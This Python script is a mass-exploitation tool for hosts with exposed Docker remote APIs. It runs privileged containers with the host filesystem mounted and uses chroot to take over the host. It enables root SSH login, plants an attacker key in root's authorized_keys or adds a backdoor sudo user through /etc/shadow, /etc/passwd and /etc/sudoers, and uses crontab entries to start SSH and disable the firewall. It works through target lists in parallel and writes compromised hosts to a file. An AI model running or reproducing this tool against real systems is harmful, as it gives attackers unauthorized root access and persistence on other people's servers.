#! /usr/bin/env python3

import os, docker, paramiko, socket, random, string
from getpass import getpass
from datetime import date
from subprocess import check_output
from optparse import OptionParser
from multiprocessing import Pool, Lock, cpu_count
from colorama import Fore, Back, Style
from time import strftime, localtime, sleep

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

lock = Lock()
thread_count = cpu_count()
check_ssh = True
allowed_images = ["ubuntu", "debian", "fedora"]
image_file = "ubuntu_image.tar"
default_image_name = "ubuntu:20.04"
ssh_configure_commands = "echo '* * * * * root systemctl start ssh' >> /etc/crontab && echo '* * * * * root ufw disable' >> /etc/crontab && "
cronjob_remove_commands = "grep -v '* * * * * root systemctl start ssh' /etc/crontab > /tmp/crontab && mv /tmp/crontab /etc/crontab"
get_unique_uid = "unique_uid=$(awk -F: '$3 > 1000 {print $3}' /etc/passwd | sort -n | awk 'BEGIN{prev=1001} {if ($1 > prev) {print prev; exit} prev=$1+1} END{if (prev > 1001) print prev}' | head -1)"
unique_uid_name = "unique_uid"
shadow_file_ending = "shadow_file_ending=$(sudo cat /host/etc/shadow | grep root | sed 's/^[^:]*:[^:]*://' | head -1)"
shadow_file_ending_name = "shadow_file_ending"
passwd_file_ending = "passwd_file_ending=$(cat /host/etc/passwd | grep root | sed 's/^[^:]*:[^:]*:[^:]*//' | head -1)"
passwd_file_ending_name = "passwd_file_ending"
password_characters = string.ascii_letters + string.digits
cronjob_sleep_time = 90
volumes = {
    "/": {
        "bind": "/host",
        "mode": 'rw'
    }
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

def check_port(host, port, timeout=None):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if timeout:
            socket.setdefaulttimeout(timeout)
        result = sock.connect_ex((host, port))
    except:
        return False
    else:
        if result == 0:
            return True
        sock.close()
def generatePublicPrivateKeys():
    display('*', "No Path Provided for Public Key File")
    display(':', "Creating New Private/Public Key Pairs")
    display('+', "Enter the file in which to save the key : ", end='')
    key_path = input()
    key_passphrase = getpass("Enter the Passphrase for the key : ")
    os.system(f"ssh-keygen -t rsa -b 4096 -C root -f '{key_path}' -N '{key_passphrase}'")
    return key_path, key_passphrase
def generatePassword(length):
    return ''.join([random.choice(password_characters) for _ in range(length)])
def generateHash(password):
    return check_output(f"openssl passwd -6 -salt {generatePassword(16)} {password}".split(' ')).decode().split('\n')[0]

def findDockerImage(docker_client, image_name):
    for image in docker_client.images.list():
        for tag in image.tags:
            if tag.startswith(image_name):
                return tag
    return None
def exploit(docker_client, image_name, ssh_running, target, public_key=None, user=None, password=None):
    command_payload = ""
    if not ssh_running:
        with lock:
            display('*', f"SSH not Running on {Back.MAGENTA}{target}{Back.RESET}. Enabling SSH by adding commands in CRONJOB!")
        command_payload += ssh_configure_commands
    if public_key:
        command_payload += f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config_0 && grep -v 'PubkeyAuthentication' /tmp/sshd_config_0 > /tmp/sshd_config && rm -f /tmp/sshd_config_0 && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo 'PubkeyAuthentication yes' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && grep -v 'Port' /etc/ssh/sshd_config >/tmp/sshd_config && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo Port 22 >> /etc/ssh/sshd_config && echo '' >> /root/.ssh/authorized_keys && grep '{public_key}' -v /root/.ssh/authorized_keys > /tmp/authorized_keys && mv /tmp/authorized_keys /root/.ssh/authorized_keys && echo {public_key} >> /root/.ssh/authorized_keys"
    else:
        command_payload += f"grep -v 'PermitRootLogin' /etc/ssh/sshd_config > /tmp/sshd_config_0 && grep -v 'PasswordAuthentication' /tmp/sshd_config_0 > /tmp/sshd_config && rm -f /tmp/sshd_config_0 && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config && grep -v 'Port' /etc/ssh/sshd_config >/tmp/sshd_config && mv -f /tmp/sshd_config /etc/ssh/sshd_config && echo Port 22 >> /etc/ssh/sshd_config && {get_unique_uid} && {shadow_file_ending} && echo '{user}:{password}:'${shadow_file_ending_name} >> /etc/shadow && {passwd_file_ending} && echo '{user}:x:'${unique_uid_name}${passwd_file_ending_name} >> /etc/passwd && echo '{user} ALL=(ALL:ALL) ALL' >> /etc/sudoers"
    docker_client.containers.run(image_name, f"chroot /host /bin/bash -c \"{command_payload}\"", privileged=True, volumes=volumes)
    return True if ssh_running else False
def checkExploit(target, private_key_file_path=None, private_key_passphrase=None, user="root", password="None", port=22):
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        private_key = paramiko.RSAKey.from_private_key_file(private_key_file_path, private_key_passphrase) if private_key_file_path != None else None
        ssh_client.connect(target, port=port, username=user, pkey=private_key, look_for_keys=False, allow_agent=False) if private_key != None else ssh_client.connect(target, port=port, username=user, password=password, look_for_keys=False, allow_agent=False)
        stdin, stdout, stderr = ssh_client.exec_command("uname -a")
        info = stdout.readlines()[0]
        ssh_client.close()
        return True, info.replace('\n', '')
    except Exception as error:
        return False, error

def main(target, timeout, key_path=None, public_key=None, key_passphrase=None, user=None, password=None, checkPort=True):
    method = None
    with lock:
        display(':', f"Connecting to {Back.MAGENTA}{target}{Back.RESET}...")
    remote_docker_url = f"tcp://{target}"
    docker_client = docker.DockerClient(base_url=remote_docker_url)
    docker_image, image_installed = None, False
    for allowed_image in allowed_images:
        docker_image = findDockerImage(docker_client, allowed_image)
        if docker_image:
            with lock:
                display('+', f"Found Image {Back.MAGENTA}{docker_image}{Back.RESET}")
            break
    if not docker_image:
        with lock:
            display('-', f"Any Preinstalled usable Docker Image not found on {Back.MAGENTA}{target}{Back.RESET}!")
        docker_image = default_image_name
        with lock:
            display('*', f"Pushing Image {Back.MAGENTA}{docker_image}{Back.RESET} on {Back.MAGENTA}{target}{Back.RESET}")
        with open(image_file, 'rb') as file:
            docker_client.images.load(file.read())
        image_installed = True
    with lock:
        display('+', f"Using Image {Back.MAGENTA}{docker_image}{Back.RESET} on {Back.MAGENTA}{target}{Back.RESET}")
        display('-', f"Exploiting {Back.MAGENTA}{target}{Back.RESET}...")
    if checkPort and check_port(target.split(':')[0], 22, timeout):
        ssh_running = True
    elif not checkPort:
        ssh_running = True
    else:
        ssh_running = False
    ssh_status = exploit(docker_client, docker_image, ssh_running, target, public_key=public_key)
    with lock:
        display(':', f"Checking if Target {Back.MAGENTA}{target}{Back.RESET} was successfully exploited or not")
    if not ssh_status:
        sleep(cronjob_sleep_time)
    exploit_status, info = checkExploit(target.split(':')[0], key_path, key_passphrase)
    if exploit_status:
        with lock:
            display('+', f"Successfully Exploited Target => {Back.MAGENTA}{target}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
        successful_exploitation = True
        method = "PKey"
    else:
        with lock:
            display('-', f"Failed to Exploit Target {Back.YELLOW}{target}{Back.RESET} using Public Key Authentication")
            if user:
                display(':', f"Adding user {Back.MAGENTA}{user}{Back.RESET} on Target {Back.MAGENTA}{target}{Back.RESET}")
        successful_exploitation = False
    if not successful_exploitation and user:
        ssh_status = exploit(docker_client, docker_image, ssh_running, target, user=user, password=password)
        with lock:
            display(':', f"Checking if Target {Back.MAGENTA}{target}{Back.RESET} was successfully exploited or not")
        exploit_status, info = checkExploit(target.split(':')[0], user=user, password=user_password)
        if exploit_status:
            with lock:
                display('+', f"Successfully Exploited Target => {Back.MAGENTA}{target}{Back.RESET} ({Back.MAGENTA}{info}{Back.RESET})")
            successful_exploitation = True
            method = "User"
        else:
            with lock:
                display('-', f"Failed to Exploit Target {Back.YELLOW}{target}{Back.RESET} By Adding User")
            successful_exploitation = False
    if not ssh_status:
        display('*', f"Removing Added Commands from CRONJOB of target {Back.MAGENTA}{target}{Back.RESET}")
        docker_client.containers.run(docker_image, cronjob_remove_commands, privileged=True, volumes=volumes)
    if image_installed:
        display(':', f"Removing Image {Back.MAGENTA}{docker_image}{Back.RESET}")
        image = docker_client.images.get(docker_image)
        image.remove(force=True)
    with lock:
        display(':', f"Closing Connection with {Back.MAGENTA}{target}{Back.RESET}...")
    docker_client.close()
    return successful_exploitation, method
def multiProcessingHandler(targets, key_path=None, public_key=None, key_passphrase=None, user=None, password=None, timeout=None, checkPort=True):
    successful_exploits = []
    for target in targets:
        try:
            exploit_status, method = main(target, timeout, key_path, public_key, key_passphrase, user, password, checkPort)
        except Exception as error:
            with lock:
                display('-', f"Error while Exploiting {Back.MAGENTA}{target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            continue
        if exploit_status:
            successful_exploits.append([target, key_path, '']) if method == "PKey" else successful_exploits.append([target, user, user_password])
    return successful_exploits

if __name__ == "__main__":
    arguments = get_arguments(('-t', "--target", "target", "Target Servers (Seperated by ',' or File Name)"),
                              ('-p', "--keys-path", "key_path", "Path for Public Key for SSH (Leave Empty to Generate New)"),
                              ('-u', "--user", "user", "User to Add in the Target Machine (If Public Key Authentication Fails)"),
                              ('-c', "--check-port", "check_port", f"Check SSH Port (True/False, Default={check_ssh})"),
                              ('-T', "--timeout", "timeout", "Timeout for Request"),
                              ('-w', "--write", "write", "File to Dump Successful Exploited Targets (default=current data and time)"))
    if not arguments.target:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.target, 'r') as file:
                arguments.target = [target.strip() for target in file.read().split('\n') if target != '']
        except FileNotFoundError:
            arguments.target = arguments.target.split(',')
        except Exception as error:
            display('-', f"Error Occured while Reading File {Back.MAGENTA}{arguments.target}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if arguments.key_path:
        try:
            with open(f"{arguments.key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
            key_passphrase = getpass(f"Enter Passpharse for {arguments.key_path} : ")
            key_path = arguments.key_path
        except FileNotFoundError:
            key_path, key_passphrase = generatePublicPrivateKeys()
            try:
                with open(f"{key_path}.pub", 'r') as file:
                    arguments.public_key = file.read().replace('\n', '').strip()
            except Exception as error:
                display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
                exit(0)
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{arguments.public_key}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    else:
        key_path, key_passphrase = generatePublicPrivateKeys()
        try:
            with open(f"{key_path}.pub", 'r') as file:
                arguments.public_key = file.read().replace('\n', '').strip()
        except Exception as error:
            display('-', f"Error Occured while Reading Public Key File {Back.MAGENTA}{key_path}.pub{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.user:
        arguments.user = None
        user_password = generatePassword(0)
        display('*', f"No User Provided")
    else:
        user_password = getpass(f"Enter the Password for {arguments.user} : ")
    if arguments.check_port == "False":
        arguments.check_port = False
    else:
        arguments.check_port = check_ssh
    if not arguments.timeout:
        arguments.timeout = None
    else:
        arguments.timeout = float(arguments.timeout)
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    total_targets = len(arguments.target)
    target_divisions = [arguments.target[group*total_targets//thread_count: (group+1)*total_targets//thread_count] for group in range(thread_count)]
    pool = Pool(thread_count)
    threads = []
    successful_exploits = []
    for thread_index, target_division in enumerate(target_divisions):
        threads.append(pool.apply_async(multiProcessingHandler, (target_division, key_path, arguments.public_key, key_passphrase, arguments.user, generateHash(user_password), arguments.timeout, arguments.check_port)))
    for thread in threads:
        successful_exploits.extend(thread.get())
    pool.close()
    pool.join()
    display(':', f"Dumping Successfully Exploited Targets to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'w') as file:
        file.write('\n'.join([f"{target},{value_1},{value_2}" for target, value_1, value_2 in successful_exploits]))